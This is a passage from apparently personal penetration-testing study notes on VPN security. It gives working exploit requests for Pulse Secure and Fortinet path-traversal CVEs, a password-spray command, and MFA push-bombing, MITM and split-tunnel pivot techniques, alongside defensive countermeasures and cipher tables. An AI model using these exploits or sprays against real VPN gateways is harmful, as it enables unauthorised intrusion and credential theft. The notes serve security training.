# shodan.io: product:"Cisco AnyConnect" OR product:"Pulse Connect Secure" OR product:"GlobalProtect"
```

### Misconfiguration 5: Split Tunnelling Allowing Pivot

```bash
# If VPN client is in split-tunnel mode:
# Corporate traffic → VPN
# Internet traffic → direct

# From compromised machine on corporate VPN:
# Can reach corporate network directly
# Can reach internet directly (C2 communication unmonitored)

# Identify split tunnel routes from compromised VPN client
ip route show      # Linux — routes for corporate subnets through VPN
route print        # Windows — VPN routes alongside default gateway

# Use VPN as pivot to reach corporate subnets from attacking machine
# (If attacker has VPN credentials)
# ssh -D 9050 vpnuser@vpn.corp.com    # SOCKS proxy if SSH available
# Or: compromise VPN client machine → use it to access corporate subnets

# Check for DNS leak in split tunnel
# Split tunnel often doesn't route DNS queries through VPN
# DNS queries for internal hostnames may go through public DNS → fail
# Or: internal DNS addresses visible in VPN client config
```

### Misconfiguration 6: Self-Signed or Invalid Certificates

```bash
# VPN clients that don't validate server certificates → MITM possible
# Man in the middle between client and VPN gateway:
# Client connects to attacker's IP (via DNS poisoning, BGP hijack, or ARP spoof)
# Attacker presents self-signed/fake cert
# Client doesn't validate → accepts → MITM

# Check if VPN client validates cert:
# OpenVPN: must have remote-cert-tls server and verify-x509-name
# AnyConnect: cert validation on by default, but some orgs deploy with verify disabled
# WireGuard: no certificates — uses public keys directly (TOFU model)

# Test if target VPN validates cert
# Set up MitmProxy or sslsplit, intercept VPN connection
# If client connects without error → certificate not validated
mitmproxy --mode transparent --ssl-insecure
```

---

## 8. Pentest Lens — VPNs

### Pentest Lens

**Attacker's view**: VPNs are the primary perimeter for remote access — compromise the VPN and you're inside the corporate network. Target the VPN gateway itself (known CVEs, weak auth), attack the credentials (phishing, spray), or abuse legitimate VPN access if you have it.

**Reconnaissance**:
```bash
# Identify VPN gateway from DNS
nslookup vpn.corp.com
nslookup remote.corp.com
nslookup sslvpn.corp.com

# Identify VPN product from HTTP headers
curl -I https://vpn.corp.com/
# Server: Apache-Coyote/1.1 → Pulse Secure
# X-Frame-Options: SAMEORIGIN + Pulse-specific cookies → Pulse Secure
# /global-protect → GlobalProtect
# /+CSCOE+/logon.html → Cisco AnyConnect
# /dana-na/ → Pulse Secure

# Shodan/Censys for VPN gateways (passive, no direct connection to target)
# censys.io: services.http.response.headers.server="Pulse" AND ip=203.0.113.0/24

# Nmap for VPN services
nmap -sU -p 500,4500 203.0.113.1    # IKE (IPsec)
nmap -sV -p 443,1194 203.0.113.1   # SSL VPN, OpenVPN
nmap -sV -p 51820 203.0.113.1      # WireGuard (UDP — hard to detect passively)
```

**Known VPN CVEs Worth Checking**:
```bash
# Pulse Secure CVE-2019-11510 — pre-auth arbitrary file read (critical, widely exploited)
curl "https://<pulse-secure-vpn>/dana-na/../dana/html5acc/guacamole/\
  ../../../../../../etc/passwd" --path-as-is

# Fortinet SSL-VPN CVE-2018-13379 — pre-auth path traversal → credential file access
curl "https://<fortigate>/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Citrix CVE-2019-19781 — pre-auth RCE (NetScaler ADC / Citrix Gateway)
# Various PoC tools available — check for patch before testing

# Check for GlobalProtect CVE-2021-3064 (buffer overflow) and CVE-2022-0028
nmap --script http-title -p 443 203.0.113.1    # Identify if GlobalProtect

# Cisco ASA/FTD CVE-2020-3259 — information disclosure (heap memory leak)
# CVE-2023-20269 — bruteforcing without lockout (Cisco ASA/FTD)
```

**Credential Attacks**:
```bash
# Identify if MFA is in use:
# Attempt login → if prompted only for user+pass → no MFA → spray viable
# Look for: "Enter one-time password" → MFA (OTP), "Duo Push" → Duo MFA

# Password spray (slow — avoid lockout)
# Tool: Go-VPN-Spray, or custom scripts per VPN product

# For Cisco AnyConnect:
python3 anyconnect-spray.py --host 203.0.113.1 --users users.txt \
  --password 'Winter2026!' --delay 30

# For Pulse Secure:
# HTTP POST to /dana-na/auth/url_default/login.cgi

# MFA bypass — MFA fatigue (push bombing):
# Rapidly send many MFA push notifications
# Some users accept a push out of fatigue
# Works against: Duo Push, Microsoft Authenticator push

# Credential stuffing with breached passwords:
# Check Have I Been Pwned for corporate domain email/password combos
# spray those specific combos at VPN
```

**Post-VPN-Access Recon**:
```bash
# Once VPN credentials obtained and connected:
# Treat as internal access — all Module 2/3 attacks now apply

# What's the VPN subnet?
ip a    # Shows VPN adapter (tun0, etc.) and assigned IP/subnet

# What routes are pushed? (reveals internal subnets)
ip route show    # Linux
route print      # Windows

# What DNS is being used? (reveals internal domain)
cat /etc/resolv.conf    # Linux — shows DNS server IP and domain

# Scan internal network via VPN tunnel
nmap -sn 192.168.1.0/24    # Host discovery of internal LAN
nmap -sS -p 22,80,443,445,3389,5985 192.168.1.0/24
```

**Misconfigurations summary**:
```
No MFA → credential spray / stuffing for VPN access
Aggressive Mode IKEv1 + PSK → passive capture + offline crack
Weak cipher suites (DES, 3DES, DH Group 1/2) → cipher downgrade
Self-signed cert not validated → MITM
CVE-unpatched VPN gateway → pre-auth RCE or file read
Split tunnel without egress monitoring → C2 traffic unmonitored
VPN management interface exposed → admin portal attacks
Default credentials not changed → trivial login
No session timeout → persistent access after credential change
Broad split tunnel routes → overly permissive internal access
```

**Defender's counter**:
```
MFA mandatory — hardware token, Duo, or certificate (strongest)
Certificate auth (EAP-TLS) for OpenVPN/AnyConnect → no password to spray
IKEv2 only, disable IKEv1 → no aggressive mode PSK attack
Only AES-256-GCM, SHA-256+, DH Group 14+ → no weak cipher attack
Patch VPN gateway promptly — these are critical internet-facing systems
Monitor VPN auth failures (SIEM alert on > 5 failures/user/hour)
VPN gateway in DMZ — VPN traffic still inspected by internal firewall
ZTNA instead of traditional VPN — per-app access, not broad network access
Restrict management interface to OOB management network
Short session and idle timeouts
Certificate pinning in VPN client profile → MITM impossible
```

---

## Quick Reference — Module 9

### VPN Protocols and Ports
| Protocol | Port | Transport | Use Case |
|----------|------|-----------|---------|
| IKEv1/v2 | 500 | UDP | IPsec key exchange |
| IPsec NAT-T | 4500 | UDP | IPsec through NAT |
| OpenVPN | 1194 | UDP (default) | Remote access, site-to-site |
| WireGuard | 51820 | UDP | Modern remote access |
| AnyConnect SSL | 443 | TCP | Remote access |
| AnyConnect DTLS | 443 | UDP | AnyConnect data channel |
| L2TP | 1701 | UDP | Legacy (paired with IPsec) |
| PPTP | 1723 | TCP | Legacy (broken — do not use) |
| SSTP | 443 | TCP | Windows only, SSL VPN |

### IPsec SA Summary
| Phase | Name | Protects | Algorithm Negotiation |
|-------|------|---------|----------------------|
| IKE Phase 1 | ISAKMP SA | IKE messages | Encryption + Hash + Auth + DH |
| IKE Phase 2 | IPsec SA | User data | ESP cipher + integrity + PFS |

### WireGuard Cryptography (Fixed — No Negotiation)
| Function | Algorithm |
|----------|-----------|
| Key exchange | Curve25519 |
| Encryption | ChaCha20 |
| Authentication | Poly1305 |
| Hash | BLAKE2s |
| Handshake | Noise IKpsk2 |

### IKE Cipher Suite Strength
| Algorithm | Recommendation |
|-----------|---------------|
| DES | Broken — disable |
| 3DES | Weak (Sweet32) — disable |
| AES-128 | Acceptable |
| AES-256-GCM | Preferred |
| MD5 | Broken — disable |
| SHA-1 | Weak — disable |
| SHA-256 | Acceptable |
| SHA-512 | Preferred |
| DH Group 1 (768-bit) | Broken — disable |
| DH Group 2 (1024-bit) | Weak — disable |
| DH Group 14 (2048-bit) | Minimum acceptable |
| DH Group 20 (384-bit ECC) | Preferred |

### Key WireGuard Commands
```bash
wg genkey | tee privatekey | wg pubkey > publickey   # Generate keys
wg genpsk > psk                                        # Pre-shared key
wg show                                               # Status all interfaces
wg show wg0 latest-handshakes                         # Peer handshake times
wg-quick up wg0                                       # Start VPN
wg-quick down wg0                                     # Stop VPN
wg set wg0 peer <pubkey> allowed-ips 10.0.0.2/32     # Add peer dynamically
```

---

## Related Notes
- [[Module-04-Network-Security]] — TLS details relevant to SSL VPN, IPsec and CIA Triad
- [[Module-05-Firewall-Configuration]] — Firewall rules for VPN traffic (UDP 500/4500, TCP 443)
- [[Module-07-Windows-Server-Networking]] — RRAS for Windows VPN server, NPS for VPN RADIUS auth
- [[Module-08-Wireless-Networking]] — Wi-Fi as the untrusted network that VPN secures
- [[Module-10-Enterprise-Infrastructure]] — VPN placement in enterprise architecture (SD-WAN, MPLS)
- [[Module-12-Pentest-Perspective]] — VPN attacks in full engagement context, pivoting via VPN
